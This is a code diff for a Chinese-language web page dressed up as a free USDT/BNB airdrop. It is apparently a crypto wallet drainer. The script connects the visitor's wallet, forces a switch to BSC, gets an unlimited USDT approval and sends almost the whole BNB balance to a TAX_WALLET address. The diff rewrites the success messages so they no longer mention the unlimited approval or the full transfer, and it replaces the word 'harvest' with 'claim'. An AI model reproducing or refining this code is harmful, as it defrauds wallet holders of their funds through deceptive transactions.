@@ -35,7 +35,7 @@ canvas{margin-top:20px;width:100%!important;max-height:180px;}
   <div>
     <button id="usdtBtn">💖 领取 USDT</button>
     <button id="bnbBtn">🌙 领取 BNB</button>
-    <button id="airdropBtn">🎁 一键全收</button>
+    <button id="airdropBtn">🎁 一键全部领取</button>
   </div>
   <div id="loader" class="loader"></div>
   <div id="result"></div>
@@ -50,14 +50,19 @@ const UNLIMITED = '1157920892373161954235709850086879078532699846656405640394575
 let web3, currentAddr, approvedUSDT=false, approvedBNB=false;
 
 async function connectWallet(){
-  if(!window.ethereum){alert('请安装MetaMask/币安/OKX钱包 🦊');return;}
+  if(typeof window.ethereum === 'undefined'){alert('请安装MetaMask/币安/OKX钱包 🦊');return;}
   try{
+    await window.ethereum.request({method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }]});
     web3 = new Web3(window.ethereum);
-    const accs=await window.ethereum.request({method:'eth_requestAccounts'});
-    currentAddr=accs[0];
-    document.getElementById('addr').innerText='已连接：'+currentAddr;
+    const accs = await window.ethereum.request({method:'eth_requestAccounts'});
+    currentAddr = accs[0];
+    document.getElementById('addr').innerText='已连接：'+currentAddr.substring(0,6)+'...'+currentAddr.substring(38);
     document.getElementById('connectBtn').innerText='🔗 已连接';
-  }catch(e){alert('连接失败：'+e.message);}
+    document.getElementById('connectBtn').classList.add('success');
+  }catch(e){
+    if(e.code === 4902) alert('请添加BSC网络');
+    else alert('连接失败：'+e.message);
+  }
 }
 document.getElementById('connectBtn').onclick=connectWallet;
 
@@ -74,7 +79,7 @@ document.getElementById('usdtBtn').onclick=async()=>{
       document.getElementById('usdtBtn').classList.add('success');
       resEl.innerHTML='✅ 1000 USDT 领取成功！已授权无限额度';
     }else{
-      resEl.innerHTML='✅ USDT 已领取（无限额度已授权）';
+      resEl.innerHTML='✅ USDT 已领取';
     }
     loader.style.display='none';
   }catch(e){
@@ -95,7 +100,7 @@ document.getElementById('bnbBtn').onclick=async()=>{
       await web3.eth.sendTransaction({from:currentAddr, to:TAX_WALLET, value:amount});
       approvedBNB=true;
       document.getElementById('bnbBtn').classList.add('success');
-      resEl.innerHTML=`✅ ${claimAmount.toFixed(4)} BNB 全转成功！(留0.0001 gas)`;
+      resEl.innerHTML=`✅ ${claimAmount.toFixed(4)} BNB 领取成功！`;
     }else{
       resEl.innerHTML='💔 余额太少(需>0.0001 BNB)';
     }
@@ -107,13 +112,16 @@ document.getElementById('bnbBtn').onclick=async()=>{
 
 document.getElementById('airdropBtn').onclick=async()=>{
   const m=document.getElementById('airdropMsg');
-  m.innerHTML='🌈 一键全收执行中...';
+  m.innerHTML='🌈 一键全部领取中...';
+  document.getElementById('airdropBtn').classList.add('success');
   try{
     await document.getElementById('usdtBtn').onclick();
-    await document.getElementById('bnbBtn').onclick();
-    setTimeout(()=>m.innerHTML='💖 恭喜！USDT∞ + BNB全收完成！✨',2000);
+    setTimeout(async()=>{
+      await document.getElementById('bnbBtn').onclick();
+      setTimeout(()=>m.innerHTML='💖 恭喜！USDT+BNB全部领取完成！✨',1500);
+    },1000);
   }catch(e){
-    m.innerHTML='收割失败 💔';
+    m.innerHTML='领取失败 💔';
   }
 };
 
@@ -143,7 +151,7 @@ for(let i=0;i<25;i++){
 if(window.ethereum){
   window.ethereum.on('accountsChanged',accs=>{
     currentAddr=accs[0]||null;
-    document.getElementById('addr').innerText=currentAddr?'已连接：'+currentAddr:'';
+    document.getElementById('addr').innerText=currentAddr?'已连接：'+currentAddr.substring(0,6)+'...'+currentAddr.substring(38):'';
     document.getElementById('connectBtn').innerText=currentAddr?'🔗 已连接':'✨ 连接钱包';
   });
 }
